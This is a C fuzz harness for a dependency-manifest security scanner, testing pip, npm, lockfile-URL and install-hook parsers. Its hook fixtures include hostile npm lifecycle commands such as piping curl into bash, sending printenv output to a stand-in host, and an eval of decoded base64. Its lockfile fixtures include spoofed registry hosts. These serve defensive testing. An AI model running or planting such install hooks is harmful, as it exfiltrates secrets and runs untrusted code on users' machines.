/*
 * tests/hlse_manifest_fuzz.c
 *
 * Fuzz harness for the manifest dependency-file parsers, which consume
 * fully untrusted file content (requirements.txt / package.json style).
 *
 * Functions exercised:
 *   hlse_manifest_ecosystem(path)           — basename inference
 *   hlse_manifest_name_pip(line, out, cap)  — pip requirement-line parse
 *   hlse_manifest_name_npm(&cursor, ...)    — package.json stream parse
 *   hlse_manifest_resolved_host(line, ...)  — resolved-URL host extract
 *   hlse_manifest_resolved_suspicious(host) — registry allowlist
 *   hlse_manifest_hook_flags(line, ...)     — lifecycle-hook risk scan
 *
 * All three are pure in-memory parsers — no disk access — so arbitrary
 * byte sequences cover real input space.
 *
 * Build (plain):
 *   gcc -O0 -g -Wall -Wextra -D_POSIX_C_SOURCE=200809L \
 *       -o tests/fuzz_manifest tests/hlse_manifest_fuzz.c \
 *       hlse_manifest.c hlse_util.c -I. -lm
 * Build (ASan):
 *   gcc -O1 -g -Wall -Wextra -D_POSIX_C_SOURCE=200809L \
 *       -fsanitize=address,undefined \
 *       -o tests/fuzz_manifest_asan tests/hlse_manifest_fuzz.c \
 *       hlse_manifest.c hlse_util.c -I. -lm
 *
 * Usage: ./tests/fuzz_manifest [iterations] [seed]
 */

#define _POSIX_C_SOURCE 200809L

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <time.h>
#include "../hlse_manifest.h"

static jmp_buf crash_jmp;
static char    last_input[8192];
static size_t  last_input_len;

static void crash_handler(int sig) { (void)sig; longjmp(crash_jmp, 1); }

static unsigned long xorshift(unsigned long *s) {
    unsigned long x = *s;
    x ^= x << 13; x ^= x >> 7; x ^= x << 17;
    *s = x; return x;
}

/* ── Input generators ─────────────────────────────────────────────────── */

static size_t gen_random(char *buf, size_t cap, unsigned long *rng) {
    size_t len = xorshift(rng) % 512;
    if (len >= cap) len = cap - 1;
    size_t i;
    for (i = 0; i < len; i++) buf[i] = (char)(xorshift(rng) & 0xFF);
    buf[len] = '\0';
    return len;
}

/* requirements.txt-ish: name[extras]op version, comments, -r includes */
static size_t gen_requirements(char *buf, size_t cap, unsigned long *rng) {
    static const char *names[] = {
        "requests", "reqests", "numpy", "flask", "Django>=4",
        "  pillow  ", "pkg[extra1,extra2]", "pkg==1.0",
        "-r other.txt", "--index-url https://x", "# comment",
        "git+https://github.com/x/y.git", "pkg~=2.0; python_version>'3'",
        "a" "\xc3\xa9" "pkg", "pkg\x00hidden", NULL
    };
    int n = 0; while (names[n]) n++;
    const char *nm = names[xorshift(rng) % (unsigned long)n];
    size_t len = strlen(nm);
    if (len >= cap) len = cap - 1;
    memcpy(buf, nm, len);
    buf[len] = '\0';
    return len;
}

/* package.json-ish: nested objects, arrays, escapes, version maps */
static size_t gen_package_json(char *buf, size_t cap, unsigned long *rng) {
    static const char *frags[] = {
        "{\"dependencies\":{\"react\":\"^18\"}}",
        "{\"devDependencies\":{\"reqests\":\"1.0\"}}",
        "{\"dependencies\":{}}",
        "{\"dependencies\":{\"a\":{\"b\":{\"c\":1}}}}",
        "{\"deps\":\"not-an-object\"}",
        "{\"dependencies\":[\"array\",\"not\",\"object\"]}",
        "{\"dependencies\":{\"x\\\"y\":\"1\"}}",
        "{", "}", "[]", "null", "\"deps\"", "",
        "{\"peerDependencies\":{\"x\":\"*\"},\"dependencies\":{",
        NULL
    };
    int n = 0; while (frags[n]) n++;
    const char *fr = frags[xorshift(rng) % (unsigned long)n];
    size_t len = strlen(fr);
    if (len >= cap) len = cap - 1;
    memcpy(buf, fr, len);
    buf[len] = '\0';
    /* sometimes append random tail */
    if (xorshift(rng) % 4 == 0 && len + 64 < cap) {
        size_t extra = xorshift(rng) % 64;
        size_t i;
        for (i = 0; i < extra; i++) buf[len + i] = (char)(xorshift(rng) & 0xFF);
        len += extra;
        buf[len] = '\0';
    }
    return len;
}

/* manifest path names for ecosystem inference */
static size_t gen_pathname(char *buf, size_t cap, unsigned long *rng) {
    static const char *paths[] = {
        "requirements.txt", "requirements-dev.txt", "package.json",
        "pkg/package.JSON", "dir/../requirements.txt", "REQUIREMENTS.TXT",
        "a/b/c/package.json", "x", "", "/abs/package.json",
        "requirements.txt\x00evil", "pack\x01age.json",
        "yarn.lock", "pnpm-lock.yaml", "dir/pnpm-lock.yaml", NULL
    };
    int n = 0; while (paths[n]) n++;
    const char *p = paths[xorshift(rng) % (unsigned long)n];
    size_t len = strlen(p);
    if (len >= cap) len = cap - 1;
    memcpy(buf, p, len);
    buf[len] = '\0';
    return len;
}

/* lockfile-ish lines: resolved/resolution/tarball URL fields */
static size_t gen_lockfile(char *buf, size_t cap, unsigned long *rng) {
    static const char *frags[] = {
        "\"resolved\": \"https://registry.npmjs.org/x/-/x-1.tgz\"",
        "\"resolved\": \"https://evil-mirror.example/e.tgz\"",
        "  resolved \"https://registry.yarnpkg.com/y/-/y-2.tgz\"",
        "resolution: https://codeload.github.com/a/b/tar.gz",
        "\"tarball\": \"http://no-tls.example/x.tgz\"",
        "\"resolved\": \"https://github.com.evil.example/x\"",
        "\"resolved\": \"https://x.github.com/ok\"",
        "\"resolved\": \"\"",
        "\"resolved\": https:",
        "\"resolved\": \"https://a:8080@evil.example/x.tgz\"",
        "resolved:////weird", "\"resolution\"\"resolution\"http://h/",
        NULL
    };
    int n = 0; while (frags[n]) n++;
    const char *fr = frags[xorshift(rng) % (unsigned long)n];
    size_t len = strlen(fr);
    if (len >= cap) len = cap - 1;
    memcpy(buf, fr, len);
    buf[len] = '\0';
    if (xorshift(rng) % 4 == 0 && len + 64 < cap) {
        size_t extra = xorshift(rng) % 64;
        size_t i;
        for (i = 0; i < extra; i++) buf[len + i] = (char)(xorshift(rng) & 0xFF);
        len += extra;
        buf[len] = '\0';
    }
    return len;
}

/* lifecycle-hook lines: scripts block values */
static size_t gen_hookline(char *buf, size_t cap, unsigned long *rng) {
    static const char *frags[] = {
        "\"preinstall\": \"node setup_bun.js\"",
        "\"postinstall\": \"curl x | bash\"",
        "\"install\": \"node-gyp rebuild\"",
        "\"prepare\": \"husky install\"",
        "\"postinstall\": \"printenv | curl -d @- https://w.example\"",
        "\"preinstall\": \"node bundle.js\"",
        "\"install\": \"node -e \\\"eval(atob('AAAA'))\\\"\"",
        "\"test\": \"jest\"",
        "\"preinstall\"", "\"postinstall\": \"\"",
        NULL
    };
    int n = 0; while (frags[n]) n++;
    const char *fr = frags[xorshift(rng) % (unsigned long)n];
    size_t len = strlen(fr);
    if (len >= cap) len = cap - 1;
    memcpy(buf, fr, len);
    buf[len] = '\0';
    return len;
}

/* ── Exercise ─────────────────────────────────────────────────────────── */

static void exercise(const char *buf) {
    char out[256];
    const char *cursor;
    int in_deps, guard;
    char hout[4][HLSE_HOOK_REASON_LEN];
    int hsc[4];
    size_t hn;

    (void)hlse_manifest_ecosystem(buf);
    (void)hlse_manifest_name_pip(buf, out, sizeof(out));
    /* npm stream parse: drain with a hard iteration bound */
    cursor = buf;
    in_deps = 0;
    for (guard = 0; guard < 64; guard++) {
        if (!hlse_manifest_name_npm(&cursor, &in_deps, out, sizeof(out)))
            break;
    }
    if (hlse_manifest_resolved_host(buf, out, sizeof(out)))
        (void)hlse_manifest_resolved_suspicious(out);
    hn = hlse_manifest_hook_flags(buf, hout, hsc, 4);
    (void)hn;
}

/* ── Main ─────────────────────────────────────────────────────────────── */

typedef size_t (*gen_fn)(char *, size_t, unsigned long *);

int main(int argc, char **argv) {
    long iterations = (argc > 1) ? atol(argv[1]) : 100000;
    unsigned long seed = (argc > 2) ? (unsigned long)atol(argv[2]) : 0xBADC0DEUL;
    if (seed == 0) seed = (unsigned long)time(NULL);

    printf("HLSE Manifest-Parser Fuzz Harness\n");
    printf("  iterations: %ld\n  seed:       0x%lx\n\n", iterations, seed);

    struct sigaction sa;
    sa.sa_handler = crash_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS,  &sa, NULL);
    sigaction(SIGFPE,  &sa, NULL);
    sigaction(SIGABRT, &sa, NULL);

    gen_fn generators[] = {
        gen_random,
        gen_requirements,
        gen_package_json,
        gen_pathname,
        gen_lockfile,
        gen_hookline,
    };
    const int n_gen = (int)(sizeof(generators) / sizeof(generators[0]));

    long crashes = 0, ok = 0;
    char buf[8192];
    unsigned long rng = seed;

    long i;
    for (i = 0; i < iterations; i++) {
        int g = (int)(xorshift(&rng) % (unsigned long)n_gen);
        (void)generators[g](buf, sizeof(buf), &rng);

        last_input_len = strlen(buf);
        if (last_input_len < sizeof(last_input))
            memcpy(last_input, buf, last_input_len + 1);

        if (setjmp(crash_jmp) == 0) {
            exercise(buf);
            ok++;
        } else {
            crashes++;
            fprintf(stderr, "CRASH at iter %ld (gen %d)\n", i, g);
            fprintf(stderr, "  input (%zu bytes): ", last_input_len);
            fwrite(last_input, 1, last_input_len < 80 ? last_input_len : 80, stderr);
            fprintf(stderr, "\n");
        }
    }

    printf("results: %ld ok, %ld crashed\n", ok, crashes);
    return crashes > 0 ? 1 : 0;
}
